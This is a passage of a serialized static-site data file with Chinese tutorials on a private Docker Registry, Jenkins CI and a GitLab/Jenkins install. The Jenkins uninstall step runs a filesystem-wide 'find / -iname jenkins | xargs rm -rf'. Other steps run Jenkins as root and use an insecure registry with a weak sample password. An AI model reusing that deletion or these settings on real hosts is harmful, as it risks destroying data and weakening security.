registry:2\n\n\n1\n\n\n这个命令将在本地启动一个名为 registry 的容器，并将本地的 /var/lib/registry 目录挂载到容器的 /var/lib/registry 目录，以保存 Registry 的数据。\n5. 测试 Registry：现在，您的私有 Docker Registry 应该已经在本地成功搭建。您可以使用以下命令来测试 Registry 是否正常工作：\n\n * 从 Docker Hub 拉取一个镜像：\n\ndocker pull ubuntu\n\n\n1\n\n * 标记该镜像为私有 Registry 的地址：\n\ndocker tag ubuntu 127.0.0.1:5000/my-ubuntu\n\n\n1\n\n * 将标记的镜像推送到私有 Registry：\n\ndocker push 127.0.0.1:5000/my-ubuntu\n\n\n1\n\n * 从私有 Registry 拉取镜像：\n\ndocker pull 127.0.0.1:5000/my-ubuntu\n\n\n1\n\n\n如果上述步骤都成功执行，那么私有 Docker Registry 就已经搭建好了，并且可以通过 http://127.0.0.1:5000/v2/my-ubuntu/tags/list 进行访问。\n\n\n# config.yml\n\nconfig 里面是一些配置信息，包括存储库位置，日志，安全认证等，首先要配置安全认证\n\n# 安装 htpasswd 文件的工具\nyum install -y httpd-tools\n# 创建一个 htpasswd 文件，并添加用户名和密码\nhtpasswd -Bbn user1 password1 > /opt/software/dockerRegistry/htpasswd\n\n\n1\n2\n3\n4\n\n\n配置 config.xml\n\n# 指定配置文件的版本。目前可用的版本为0.1。\nversion: 0.1                                                                                                                                                                           \nlog:                                                                                                                                                                                   \n  fields:                                                                                                                                                                              \n    service: registry                                                                                                                                                                  \nstorage:                                                                                                                                                                               \n  cache:                                                                                                                                                                               \n    blobdescriptor: inmemory                                                                                                                                                           \n  filesystem:         \n    # 指定存储镜像数据的目录路径。                                                                                                                                                                 \n    rootdirectory: /var/lib/registry\n  # 可执行删除操作，不能省                                                                                                                                                   \n  delete:                                                                                                                                                                              \n    enabled: true\n# 暴漏端口                                                                                                                                                                      \nhttp:                                                                                                                                                                                  \n  addr: :5000                                                                                                                                                                          \n  headers:                                                                                                                                                                             \n    X-Content-Type-Options: [nosniff]    \n# 心跳                                                                                                                                              \nhealth:                                                                                                                                                                                \n  storagedriver:                                                                                                                                                                       \n    enabled: true                                                                                                                                                                      \n    interval: 10s                                                                                                                                                                      \n    threshold: 3     \n# 基本认证(Basic Auth)，还可以使用Bearer Token认证、AWS认证、LDAP认证\nauth:\n  htpasswd: \n    realm: registry\n    path: /opt/software/dockerRegistry/htpasswd \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n\n\n如果已经启动容器，修改后需要重新启动容器\n\n\n# 使用 Docker Registry\n\n接下来先登录我们的私有库，如果是本机，使用 127.0.0.1，如果没设置账号密码，则默认是宿主机本身 SSH 连接的账号密码\n\ndocker login <registry_host>\n# 可以使用快捷命令\ndocker login 127.0.0.1:5000 --username=xxx --password=xxxx\n\n\n1\n2\n3\n\n\n登出\n\ndocker logout <registry_host>\n\n\n1\n\n\n为需要推送的镜像打 tag（必须）\n\ndocker tag my-image:latest 127.0.0.1:5000/my-image:latest\n\n\n1\n\n\n推送镜像\n\ndocker push localhost:5000/my-image:latest\n\n\n1\n\n\n\n# 访问 Registry API\n\nAPI 的访问输入你 docker 所在的 IP，加以上设置的端口就行，访问需要带版本号，目前 Docker 建议使用 v2 版本，所以请求路径需要带上，如： http://xx.xxx.xx.xx:5000/v2/_catalog\n\n * 检查连接（一定要考虑兼容）\n\nGET /v2/\n返回 200 代表ok\n返回 401 代表需要身份验证\n返回 404 代表注册表未实现 /v2/，有可能就是 v1\n\n\n1\n2\n3\n4\n\n * 列出存储库：\n\n// 获取全部\nGET /v2/_catalog\n{\n  "repositories": [\n    <name>,\n    ...\n  ]\n}\n// 分页获取\nGET /v2/_catalog?n=<integer>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n * 列出镜像 tags\n\n/v2/<ImagesName>/tags/list \n\n\n1\n',normalizedContent:'正常来说我们使用别人的私有库就足够了，比如使用 harbor，它可以帮我们很好的管理 docker，以及部署为私有或公有库给企业或其他人使用，如果想开发一套那么需要了解 docker 相关的 api，其中 dockerapi 分为如下三部分：\n\n * docker engine api：docker engine api 是 docker 引擎的 api 接口，用于与 docker 引擎进行通信和管理。通过 docker engine api，可以管理容器、镜像、网络、卷等 docker 相关资源。可以使用 docker engine api 创建、启动、停止和删除容器，构建和推送镜像，以及进行容器和镜像的管理和监控。\n * docker hub api：docker hub api 是与 docker hub 交互的 api 接口。docker hub 是一个公共的 docker 镜像仓库，用于存储和分享 docker 镜像。docker hub api 允许用户通过 api 接口与 docker hub 进行交互，可以搜索、下载、上传和删除镜像，管理仓库、标签和组织等\n * registry api：registry api 是与 docker registry 进行交互的 api 接口。docker registry 是一个私有的 docker 镜像仓库，可以自己搭建和管理。registry api 允许用户通过 api 接口与私有的 docker registry 进行交互，可以上传、下载和删除镜像，管理仓库和标签等\n\n没错，如果需要建立自己的 docker 私有库就要用到 registry api。\n\n\n# 准备\n\n要在本地搭建私有的 docker registry，您可以按照以下步骤进行操作：\n\n 1. 确保已经安装 docker，若还没有，您可以从 docker 官方网站（https://www.docker.com/）下载并安装适用于您的操作系统的 docker 版本。\n 2. 配置 docker registry：接下来，您需要创建并配置 docker registry。可以按照以下步骤进行配置：\n    * 创建一个存储 registry 数据的目录。例如，您可以创建一个名为 /var/lib/registry 的目录。\n    * 创建一个名为 config.yml 的配置文件，并在其中指定 registry 的配置选项。例如，您可以指定 registry 监听在 5000 端口上，并允许匿名访问。（具体见下面 config 配置讲解）\n 3. 为 docker registry api 提前配置\n    先进行配置，去 /etc/docker/daemon.json 添加如下一句，最好是宿主机的 ip， 不要使用 127.0.0.1 ，我这里是方便测试，不使用宿主机 ip，会造成在使用 docker engine api 报 https 错误。\n\n{\n  "insecure-registries": ["127.0.0.1:5000"]\n}\n\n\n1\n2\n3\n\n\n配置完成后需要重新启动 docker\n\nsudo systemctl restart docker\n\n\n1\n\n 4. 启动 registry 容器：使用以下命令在本地启动 registry 容器，官方文档 https://docs.docker.com/registry/deploying/?_gl=11ytdheb_gaody2nteyni4xnjkymdaxodu2_ga_xjwpqmjyhq*mty5mzk5nzeyny4yns4xlje2otm5otcymtauntmumc4w#native-basic-auth\n\ndocker run -d -p 5000:5000 --restart=always --name registry -v /opt/software/dockerregistry:/var/lib/registry -v /opt/software/dockerregistry/config.yml:/etc/docker/registry/config.yml registry:2\n\n\n1\n\n\n这个命令将在本地启动一个名为 registry 的容器，并将本地的 /var/lib/registry 目录挂载到容器的 /var/lib/registry 目录，以保存 registry 的数据。\n5. 测试 registry：现在，您的私有 docker registry 应该已经在本地成功搭建。您可以使用以下命令来测试 registry 是否正常工作：\n\n * 从 docker hub 拉取一个镜像：\n\ndocker pull ubuntu\n\n\n1\n\n * 标记该镜像为私有 registry 的地址：\n\ndocker tag ubuntu 127.0.0.1:5000/my-ubuntu\n\n\n1\n\n * 将标记的镜像推送到私有 registry：\n\ndocker push 127.0.0.1:5000/my-ubuntu\n\n\n1\n\n * 从私有 registry 拉取镜像：\n\ndocker pull 127.0.0.1:5000/my-ubuntu\n\n\n1\n\n\n如果上述步骤都成功执行，那么私有 docker registry 就已经搭建好了，并且可以通过 http://127.0.0.1:5000/v2/my-ubuntu/tags/list 进行访问。\n\n\n# config.yml\n\nconfig 里面是一些配置信息，包括存储库位置，日志，安全认证等，首先要配置安全认证\n\n# 安装 htpasswd 文件的工具\nyum install -y httpd-tools\n# 创建一个 htpasswd 文件，并添加用户名和密码\nhtpasswd -bbn user1 password1 > /opt/software/dockerregistry/htpasswd\n\n\n1\n2\n3\n4\n\n\n配置 config.xml\n\n# 指定配置文件的版本。目前可用的版本为0.1。\nversion: 0.1                                                                                                                                                                           \nlog:                                                                                                                                                                                   \n  fields:                                                                                                                                                                              \n    service: registry                                                                                                                                                                  \nstorage:                                                                                                                                                                               \n  cache:                                                                                                                                                                               \n    blobdescriptor: inmemory                                                                                                                                                           \n  filesystem:         \n    # 指定存储镜像数据的目录路径。                                                                                                                                                                 \n    rootdirectory: /var/lib/registry\n  # 可执行删除操作，不能省                                                                                                                                                   \n  delete:                                                                                                                                                                              \n    enabled: true\n# 暴漏端口                                                                                                                                                                      \nhttp:                                                                                                                                                                                  \n  addr: :5000                                                                                                                                                                          \n  headers:                                                                                                                                                                             \n    x-content-type-options: [nosniff]    \n# 心跳                                                                                                                                              \nhealth:                                                                                                                                                                                \n  storagedriver:                                                                                                                                                                       \n    enabled: true                                                                                                                                                                      \n    interval: 10s                                                                                                                                                                      \n    threshold: 3     \n# 基本认证(basic auth)，还可以使用bearer token认证、aws认证、ldap认证\nauth:\n  htpasswd: \n    realm: registry\n    path: /opt/software/dockerregistry/htpasswd \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n\n\n如果已经启动容器，修改后需要重新启动容器\n\n\n# 使用 docker registry\n\n接下来先登录我们的私有库，如果是本机，使用 127.0.0.1，如果没设置账号密码，则默认是宿主机本身 ssh 连接的账号密码\n\ndocker login <registry_host>\n# 可以使用快捷命令\ndocker login 127.0.0.1:5000 --username=xxx --password=xxxx\n\n\n1\n2\n3\n\n\n登出\n\ndocker logout <registry_host>\n\n\n1\n\n\n为需要推送的镜像打 tag（必须）\n\ndocker tag my-image:latest 127.0.0.1:5000/my-image:latest\n\n\n1\n\n\n推送镜像\n\ndocker push localhost:5000/my-image:latest\n\n\n1\n\n\n\n# 访问 registry api\n\napi 的访问输入你 docker 所在的 ip，加以上设置的端口就行，访问需要带版本号，目前 docker 建议使用 v2 版本，所以请求路径需要带上，如： http://xx.xxx.xx.xx:5000/v2/_catalog\n\n * 检查连接（一定要考虑兼容）\n\nget /v2/\n返回 200 代表ok\n返回 401 代表需要身份验证\n返回 404 代表注册表未实现 /v2/，有可能就是 v1\n\n\n1\n2\n3\n4\n\n * 列出存储库：\n\n// 获取全部\nget /v2/_catalog\n{\n  "repositories": [\n    <name>,\n    ...\n  ]\n}\n// 分页获取\nget /v2/_catalog?n=<integer>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n * 列出镜像 tags\n\n/v2/<imagesname>/tags/list \n\n\n1\n',charsets:{cjk:!0}},{title:"Jenkins(一) 持续集成及Jenkins介绍",frontmatter:{title:"Jenkins(一) 持续集成及Jenkins介绍",date:"2023-06-25T09:22:36.000Z",permalink:"/jenkins/500",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E8%BF%90%E7%BB%B4/50.Jenkins/500.Jenkins(%E4%B8%80)%20%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%8F%8AJenkins%E4%BB%8B%E7%BB%8D.html",relativePath:"01.运维/50.Jenkins/500.Jenkins(一) 持续集成及Jenkins介绍.md",key:"v-16683504",path:"/jenkins/500/",headers:[{level:2,title:"什么是持续集成",slug:"什么是持续集成",normalizedTitle:"什么是持续集成",charIndex:2},{level:3,title:"持续集成的组成要素",slug:"持续集成的组成要素",normalizedTitle:"持续集成的组成要素",charIndex:720},{level:3,title:"持续集成的好处",slug:"持续集成的好处",normalizedTitle:"持续集成的好处",charIndex:902},{level:2,title:"Jenkins介绍",slug:"jenkins介绍",normalizedTitle:"jenkins 介绍",charIndex:1039}],lastUpdated:"12/22/2023, 11:52:48 AM",lastUpdatedTimestamp:1703217168e3,headersStr:"什么是持续集成 持续集成的组成要素 持续集成的好处 Jenkins介绍",content:"# 什么是持续集成\n\n持续集成（ Continuous integration ， 简称 CI ）指的是，频繁地（一天多次）将代码集成到主干。\n\n持续集成的目的，就是让产品可以快速迭代，同时还能保持高质量。它的核心措施是，代码集成到主干之前，必须通过自动化测试。只要有一个测试用例失败，就不能集成。\n\n通过持续集成， 团队可以快速的从一个功能到另一个功能，简而言之，敏捷软件开发很大一部分都要归功于持续集成。\n\n\n\n根据持续集成的设计，代码从提交到生产，整个过程有以下几步。\n\n * 提交\n   流程的第一步，是开发者向代码仓库提交代码。所有后面的步骤都始于本地代码的一次提交（commit）。\n * 测试（第一轮）\n   代码仓库对 commit 操作配置了钩子（hook），只要提交代码或者合并进主干，就会跑自动化测试。\n * 构建\n   通过第一轮测试，代码就可以合并进主干，就算可以交付了。\n   交付后，就先进行构建（build），再进入第二轮测试。所谓构建，指的是将源码转换为可以运行的实际代码，比如安装依赖，配置各种资源（样式表、JS 脚本、图片）等等。\n * 测试（第二轮）\n   构建完成，就要进行第二轮测试。如果第一轮已经涵盖了所有测试内容，第二轮可以省略，当然，这时构建步骤也要移到第一轮测试前面。\n * 部署\n   过了第二轮测试，当前代码就是一个可以直接部署的版本（artifact）。将这个版本的所有文件打包（tar filename.tar * ）存档，发到生产服务器。\n * 回滚\n   一旦当前版本发生问题，就要回滚到上一个版本的构建结果。最简单的做法就是修改一下符号链接，指向上一个版本的目录。\n\n\n# 持续集成的组成要素\n\n * 一个自动构建过程， 从检出代码、 编译构建、 运行测试、 结果记录、 测试统计等都是自动完成的， 无需人工干预。\n * 一个代码存储库，即需要版本控制软件来保障代码的可维护性，同时作为构建过程的素材库，一般使用 SVN 或 Git。\n * 一个持续集成服务器， Jenkins 就是一个配置简单和使用方便的持续集成服务器。\n\n\n\n\n# 持续集成的好处\n\n1、降低风险，由于持续集成不断去构建，编译和测试，可以很早期发现问题，所以修复的代价就少；\n2、对系统健康持续检查，减少发布风险带来的问题；\n3、减少重复性工作；\n4、持续部署，提供可部署单元包；\n5、持续交付可供使用的版本；\n6、增强团队信心；\n\n\n# Jenkins 介绍\n\nJenkins 是一款流行的开源持续集成（Continuous Integration）工具，广泛用于项目开发，具有自动化构建、测试和部署等功能。官网： http://jenkins-ci.org/。\n\nJenkins 的特征：\n\n * 开源的 Java 语言开发持续集成工具，支持持续集成，持续部署。\n * 易于安装部署配置：可通过 yum 安装，或下载 war 包以及通过 docker 容器等快速实现安装部署，可方便 web 界面配置管理。\n * 消息通知及测试报告：集成 RSS/E-mail 通过 RSS 发布构建结果或当构建完成时通过 e-mail 通知，生成 JUnit/TestNG 测试报告。\n * 分布式构建：支持 Jenkins 能够让多台计算机一起构建 / 测试。\n * 文件识别：Jenkins 能够跟踪哪次构建生成哪些 jar，哪次构建使用哪个版本的 jar 等。\n * 丰富的插件支持：支持扩展插件，你可以开发适合自己团队使用的工具，如 git，svn，maven，docker 等。",normalizedContent:"# 什么是持续集成\n\n持续集成（ continuous integration ， 简称 ci ）指的是，频繁地（一天多次）将代码集成到主干。\n\n持续集成的目的，就是让产品可以快速迭代，同时还能保持高质量。它的核心措施是，代码集成到主干之前，必须通过自动化测试。只要有一个测试用例失败，就不能集成。\n\n通过持续集成， 团队可以快速的从一个功能到另一个功能，简而言之，敏捷软件开发很大一部分都要归功于持续集成。\n\n\n\n根据持续集成的设计，代码从提交到生产，整个过程有以下几步。\n\n * 提交\n   流程的第一步，是开发者向代码仓库提交代码。所有后面的步骤都始于本地代码的一次提交（commit）。\n * 测试（第一轮）\n   代码仓库对 commit 操作配置了钩子（hook），只要提交代码或者合并进主干，就会跑自动化测试。\n * 构建\n   通过第一轮测试，代码就可以合并进主干，就算可以交付了。\n   交付后，就先进行构建（build），再进入第二轮测试。所谓构建，指的是将源码转换为可以运行的实际代码，比如安装依赖，配置各种资源（样式表、js 脚本、图片）等等。\n * 测试（第二轮）\n   构建完成，就要进行第二轮测试。如果第一轮已经涵盖了所有测试内容，第二轮可以省略，当然，这时构建步骤也要移到第一轮测试前面。\n * 部署\n   过了第二轮测试，当前代码就是一个可以直接部署的版本（artifact）。将这个版本的所有文件打包（tar filename.tar * ）存档，发到生产服务器。\n * 回滚\n   一旦当前版本发生问题，就要回滚到上一个版本的构建结果。最简单的做法就是修改一下符号链接，指向上一个版本的目录。\n\n\n# 持续集成的组成要素\n\n * 一个自动构建过程， 从检出代码、 编译构建、 运行测试、 结果记录、 测试统计等都是自动完成的， 无需人工干预。\n * 一个代码存储库，即需要版本控制软件来保障代码的可维护性，同时作为构建过程的素材库，一般使用 svn 或 git。\n * 一个持续集成服务器， jenkins 就是一个配置简单和使用方便的持续集成服务器。\n\n\n\n\n# 持续集成的好处\n\n1、降低风险，由于持续集成不断去构建，编译和测试，可以很早期发现问题，所以修复的代价就少；\n2、对系统健康持续检查，减少发布风险带来的问题；\n3、减少重复性工作；\n4、持续部署，提供可部署单元包；\n5、持续交付可供使用的版本；\n6、增强团队信心；\n\n\n# jenkins 介绍\n\njenkins 是一款流行的开源持续集成（continuous integration）工具，广泛用于项目开发，具有自动化构建、测试和部署等功能。官网： http://jenkins-ci.org/。\n\njenkins 的特征：\n\n * 开源的 java 语言开发持续集成工具，支持持续集成，持续部署。\n * 易于安装部署配置：可通过 yum 安装，或下载 war 包以及通过 docker 容器等快速实现安装部署，可方便 web 界面配置管理。\n * 消息通知及测试报告：集成 rss/e-mail 通过 rss 发布构建结果或当构建完成时通过 e-mail 通知，生成 junit/testng 测试报告。\n * 分布式构建：支持 jenkins 能够让多台计算机一起构建 / 测试。\n * 文件识别：jenkins 能够跟踪哪次构建生成哪些 jar，哪次构建使用哪个版本的 jar 等。\n * 丰富的插件支持：支持扩展插件，你可以开发适合自己团队使用的工具，如 git，svn，maven，docker 等。",charsets:{cjk:!0}},{title:"Jenkins(二) Jenkins安装和环境配置",frontmatter:{title:"Jenkins(二) Jenkins安装和环境配置",date:"2023-06-25T09:22:36.000Z",permalink:"/jenkins/501",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E8%BF%90%E7%BB%B4/50.Jenkins/501.Jenkins(%E4%BA%8C)%20Jenkins%E5%AE%89%E8%A3%85%E5%92%8C%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE.html",relativePath:"01.运维/50.Jenkins/501.Jenkins(二) Jenkins安装和环境配置.md",key:"v-78cfb480",path:"/jenkins/501/",headers:[{level:2,title:"持续集成流程说明",slug:"持续集成流程说明",normalizedTitle:"持续集成流程说明",charIndex:2},{level:2,title:"Gitlab代码托管服务器安装",slug:"gitlab代码托管服务器安装",normalizedTitle:"gitlab 代码托管服务器安装",charIndex:433},{level:3,title:"Gitlab简介",slug:"gitlab简介",normalizedTitle:"gitlab 简介",charIndex:454},{level:3,title:"Gitlab安装",slug:"gitlab安装",normalizedTitle:"gitlab 安装",charIndex:763},{level:2,title:"Gitlab添加组、创建用户、创建项目",slug:"gitlab添加组、创建用户、创建项目",normalizedTitle:"gitlab 添加组、创建用户、创建项目",charIndex:1771},{level:2,title:"Jenkins安装",slug:"jenkins安装",normalizedTitle:"jenkins 安装",charIndex:2310},{level:2,title:"jenkins插件管理",slug:"jenkins插件管理",normalizedTitle:"jenkins 插件管理",charIndex:4225},{level:3,title:"修改Jenkins插件下载地址",slug:"修改jenkins插件下载地址",normalizedTitle:"修改 jenkins 插件下载地址",charIndex:4334},{level:2,title:"Jenkins 卸载",slug:"jenkins-卸载",normalizedTitle:"jenkins 卸载",charIndex:5079}],lastUpdated:"12/22/2023, 11:52:48 AM",lastUpdatedTimestamp:1703217168e3,headersStr:"持续集成流程说明 Gitlab代码托管服务器安装 Gitlab简介 Gitlab安装 Gitlab添加组、创建用户、创建项目 Jenkins安装 jenkins插件管理 修改Jenkins插件下载地址 Jenkins 卸载",content:'# 持续集成流程说明\n\n\n\n1. 首先，开发人员每天进行代码提交，提交到 Git 仓库\n2. 然后，Jenkins 作为持续集成工具，使用 Git 工具到 Git 仓库拉取代码到集成服务器，再配合 JDK，Maven 等软件完成代码编译，代码测试与审查，测试，打包等工作，在这个过程中每一步出错，都重新再执行一次整个流程。\n3. 最后，Jenkins 把生成的 jar 或 war 包分发到测试服务器或者生产服务器，测试人员或用户就可以访问应用。\n\n服务器列表\n\n名称         IP 地址            安装的软件\n代码托管服务器    192.168.66.100   Gitlab-12.4.2\n持续集成服务器    192.168.66.101   Jenkins-2.190.3，JDK1.8，Maven3.6.2，Git，SonarQube\n测试或生产服务器   192.168.66.102   JDK1.8，Tomcat8.5\n\n\n# Gitlab 代码托管服务器安装\n\n\n# Gitlab 简介\n\n官网： https://about.gitlab.com/\n\nGitLab 是一个用于仓库管理系统的开源项目，使用 Git 作为代码管理工具，并在此基础上搭建起来的 web 服务。\n\nGitLab 和 GitHub 一样属于第三方基于 Git 开发的作品，免费且开源（基于 MIT 协议），与 Github 类似，可以注册用户，任意提交你的代码，添加 SSHKey 等等。不同的是，GitLab 是可以部署到自己的服务器上，数据库等一切信息都掌握在自己手上，适合团队内部协作开发，你总不可能把团队内部的智慧总放在别人的服务器上吧？简单来说可把 GitLab 看作个人版的 GitHub。\n\n\n# Gitlab 安装\n\n1. 安装相关依赖\n\nyum -y install policycoreutils openssh-server openssh-clients postfix\n\n\n1\n\n\n2. 启动 ssh 服务 & 设置为开机启动\n\nsystemctl enable sshd && sudo systemctl start sshd\n\n\n1\n\n\n3. 设置 postfix 开机自启，并启动，postfix 支持 gitlab 发信功能\n\nsystemctl enable postfix && systemctl start postfix\n\n\n1\n\n\n4. 开放 ssh 以及 http 服务，然后重新加载防火墙列表\n\nfirewall-cmd --add-service=ssh --permanent\nfirewall-cmd --add-service=http --permanent\nfirewall-cmd --reload\n\n\n1\n2\n3\n\n\n> 如果关闭防火墙就不需要做以上配置\n\n5. 下载 gitlab 包，并且安装\n在线下载安装包：\n\nwget https://mirrors.tuna.tsinghua.edu.cn/gitlab-ce/yum/el6/gitlab-ce-12.4.2-ce.0.el6.x86_64.rpm\n# 安装\nrpm -i gitlab-ce-12.4.2-ce.0.el6.x86_64.rpm\n\n\n1\n2\n3\n\n\n6. 修改 gitlab 配置\n\nvi /etc/gitlab/gitlab.rb\n# 修改gitlab访问地址和端口，默认为80，我们改为82\nexternal_url \'http://192.168.66.100:82\'\nnginx[\'listen_port\'] = 82\n\n\n1\n2\n3\n4\n\n 7. 重载配置及启动 gitlab\n\ngitlab-ctl reconfigure\ngitlab-ctl restart\n\n\n1\n2\n\n\n8. 把端口添加到防火墙\n\nfirewall-cmd --zone=public --add-port=82/tcp --permanent\nfirewall-cmd --reload\n\n\n1\n2\n\n\n启动成功后，看到以下修改管理员 root 密码的页面，修改密码后，然后登录即可\n\n\n# Gitlab 添加组、创建用户、创建项目\n\n1. 创建组\n使用管理员 root 创建组，一个组里面可以有多个项目分支，可以将开发添加到组里面进行设置权限，不同的组就是公司不同的开发项目或者服务模块，不同的组添加不同的开发即可实现对开发设置权限的管理\n\n2. 创建用户\n创建用户的时候，可以选择 Regular 或 Admin 类型。创建完用户后，立即修改密码\n\n3. 将用户添加到组中\n选择某个用户组，进行 Members 管理组的成员\n\nGitlab 用户在组里面有 5 种不同权限：\n\n * Guest：可以创建 issue、发表评论，不能读写版本库 Reporter：可以克隆代码，不能提交，QA、PM 可以赋予这个权限\n * Developer：可以克隆代码、开发、提交、push，普通开发可以赋予这个权限\n * Maintainer：可以创建项目、添加 tag、保护分支、添加项目成员、编辑项目，核心开发可以赋予这个权限\n * Owner：可以设置项目访问权限 - Visibility Level、删除项目、迁移项目、管理组成员，开发组组长可以赋予这个权限\n\n4. 在用户组中创建项目\n以刚才创建的新用户身份登录到 Gitlab，然后在用户组中创建新的项目\n\n\n# Jenkins 安装\n\n1. 获取 jenkins 安装包，下载页面：http://mirrors.jenkins-ci.org/redhat/\n\n# 国内环境不是那么好，下载要科学\nwget http://mirrors.jenkins-ci.org/redhat/jenkins-2.190.3-1.1.noarch.rpm\n# 安装\nrpm -ivh jenkins-2.190.3-1.1.noarch.rpm\n\n\n1\n2\n3\n4\n\n\n2. 修改 Jenkins 配置\n\nvim /etc/sysconfig/jenkins\n# 修改内容如下\n# 能执行jenkins的用户权限\nJENKINS_USER="root" \n# 页面访问端口\nJENKINS_PORT="7777" \n\n\n1\n2\n3\n4\n5\n6\n\n\n3. 启动 Jenkins\n\nsystemctl start jenkins\n\n\n1\n\n\n> 报错\n> Starting Jenkins bash: /usr/bin/java: 没有那个文件或目录\n> Failed to start LSB: Jenkins Automation Server.\n> 是因为 jenkins 内部自己配置了 java 地址，需要改一下。\n> vim /etc/init.d/jenkins\n> /usr/bin/java 找到，并改成自己的 java 地址，我的是 /opt/software/java8/jre/bin/java，注意这里找的是 jre 的。\n> 执行 systemctl daemon-reload，在执行 systemctl start jenkins\n\n> 最新版本 Jenkins 2.346.1 和之前版本还是有不一样的地方，这里只说几个 Jenkins 2.346.1 遇到的报错：\n> 1 Aug 16 14:19:14 host-10-240-30-93 jenkins [31531]: jenkins: failed to find a valid Java installation 这种报错一直说是没安装 JAVA，但是我明明按照以上方式都配置过了，最终解决方式就是编辑 vim /usr/lib/systemd/system/jenkins.service 文件，找到被注释的 Environment="JAVA_HOME="，把自己的 JAVA 路径写上，如 /opt/software/jdk\n> 2 Aug 16 14:26:42 host-10-240-30-93 jenkins [10782]: java.net.BindException: Address already in use 你会发现在 vim /etc/sysconfig/jenkins 文件都改过了，但还是端口占用，依然需要修改 vim /usr/lib/systemd/system/jenkins.service 文件，并编辑 Environment="JENKINS_PORT=7777" 改成自己需要的端口\n> 3 Aug 16 14:28:37 host-10-240-30-93 jenkins [20925]: Caused: java.io.IOException: Failed to start Jetty 检查所有配置包括 /etc/sysconfig/jenkins 和 /usr/lib/systemd/system/jenkins.service，却报配置正确\n> 4 Aug 16 14:44:10 host-10-240-30-93 jenkins [12516]: jenkins: invalid Java version: java version "17.0.3.1" 2022-04-22 LTS JAVA 版本过高或过低导致，我用 java17 或 11 直接不行，换成 8 就好了\n\n4. 打开浏览器访问\nhttp://192.168.66.101:7777\n\n> 注意：本服务器把防火墙关闭了，如果开启防火墙，需要在防火墙添加端口\n\n5. 获取并输入 admin 账户密码\n\ncat /var/lib/jenkins/secrets/initialAdminPassword\n\n\n1\n\n\n6. 添加一个管理员账户，并进入 Jenkins 后台\n\n7. 跳过插件安装\n因为 Jenkins 插件需要连接默认官网下载，速度非常慢，而且经过会失败，所以我们暂时先跳过插件安装\n\n\n\n\n\n\n\n\n\n\n\n\n# jenkins 插件管理\n\nJenkins 本身不提供很多功能，我们可以通过使用插件来满足我们的使用。例如从 Gitlab 拉取代码，使用 Maven 构建项目等功能需要依靠插件完成。接下来演示如何下载插件。\n\n\n# 修改 Jenkins 插件下载地址\n\nJenkins 国外官方插件地址下载速度非常慢，所以可以修改为国内插件地址：Jenkins->Manage Jenkins->Manage Plugins，点击 Available\n\n\n\n\n\nsystemctl restart jenkins\n\n\n1\n\n\n\n\n此时我们可以进入 /var/lib/jenkins/updates，看到有个 default.json，这个文件里面是所有插件的地址，这里面的地址目前全是国外的地址，可以用以下命令进行替换到国内地址。\n\nsed -i \'s/http:\\/\\/updates.jenkinsci.org\\/download/https:\\/\\/mirrors.tuna.tsinghua.edu.cn\\/jenkins/g\' default.json && sed -i \'s/http:\\/\\/www.google.com/https:\\/\\/www.baidu.com/g\' default.json\n\n\n1\n\n\n最后，Manage Plugins 点击 Advanced，把 Update Site 改为国内插件下载地址\n\n> https://mirrors.tuna.tsinghua.edu.cn/jenkins/updates/update-center.json\n\n\n\n\n\n重启 jenkins ，在访问路径后面键入 restart 即可。\n\nhttp://192.168.81.102:7777/restart\n\n\n1\n\n\n重启好后，我们进行对 jenkins 进行汉化。\n\n\n\n\n\n> jenkins 版本更新太快，包括核心库也会更新，大家可以放心更新，不用怕，最多就是起不来重装。\n\n\n# Jenkins 卸载\n\n先停止 Jenkins 的运行\n\n# 方式一\nsystemctl stop jenkins\n# 方式二\nservice jenkins stop\n\n\n1\n2\n3\n4\n\n\n找到所有跟 Jenkins 相关的包\n\nrpm -qc jenkins\n\n\n1\n\n\n卸载相关包\n\nrpm -e jenkins\n\n\n1\n\n\n检查是否卸载成功\n\nrpm -ql jenkins\n\n\n1\n\n\n删除参与文件\n\nfind / -iname jenkins | xargs -n 1000 rm -rf\n\n\n1\n',normalizedContent:'# 持续集成流程说明\n\n\n\n1. 首先，开发人员每天进行代码提交，提交到 git 仓库\n2. 然后，jenkins 作为持续集成工具，使用 git 工具到 git 仓库拉取代码到集成服务器，再配合 jdk，maven 等软件完成代码编译，代码测试与审查，测试，打包等工作，在这个过程中每一步出错，都重新再执行一次整个流程。\n3. 最后，jenkins 把生成的 jar 或 war 包分发到测试服务器或者生产服务器，测试人员或用户就可以访问应用。\n\n服务器列表\n\n名称         ip 地址            安装的软件\n代码托管服务器    192.168.66.100   gitlab-12.4.2\n持续集成服务器    192.168.66.101   jenkins-2.190.3，jdk1.8，maven3.6.2，git，sonarqube\n测试或生产服务器   192.168.66.102   jdk1.8，tomcat8.5\n\n\n# gitlab 代码托管服务器安装\n\n\n# gitlab 简介\n\n官网： https://about.gitlab.com/\n\ngitlab 是一个用于仓库管理系统的开源项目，使用 git 作为代码管理工具，并在此基础上搭建起来的 web 服务。\n\ngitlab 和 github 一样属于第三方基于 git 开发的作品，免费且开源（基于 mit 协议），与 github 类似，可以注册用户，任意提交你的代码，添加 sshkey 等等。不同的是，gitlab 是可以部署到自己的服务器上，数据库等一切信息都掌握在自己手上，适合团队内部协作开发，你总不可能把团队内部的智慧总放在别人的服务器上吧？简单来说可把 gitlab 看作个人版的 github。\n\n\n# gitlab 安装\n\n1. 安装相关依赖\n\nyum -y install policycoreutils openssh-server openssh-clients postfix\n\n\n1\n\n\n2. 启动 ssh 服务 & 设置为开机启动\n\nsystemctl enable sshd && sudo systemctl start sshd\n\n\n1\n\n\n3. 设置 postfix 开机自启，并启动，postfix 支持 gitlab 发信功能\n\nsystemctl enable postfix && systemctl start postfix\n\n\n1\n\n\n4. 开放 ssh 以及 http 服务，然后重新加载防火墙列表\n\nfirewall-cmd --add-service=ssh --permanent\nfirewall-cmd --add-service=http 